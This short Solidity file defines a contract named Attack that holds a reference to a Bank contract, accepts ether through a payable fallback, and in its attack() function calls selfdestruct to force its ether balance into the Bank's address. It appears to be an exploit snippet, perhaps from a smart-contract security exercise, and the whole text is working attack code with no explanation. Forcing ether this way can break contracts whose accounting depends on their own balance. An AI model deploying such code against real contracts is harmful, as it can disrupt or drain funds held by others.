contract Attack{

    Bank bank;

    constructor (Bank _bank){
        bank = _bank;
    }

    fallback() external payable{}

    function attack() external {
        selfdestruct(payable(address(bank)));
    }

}
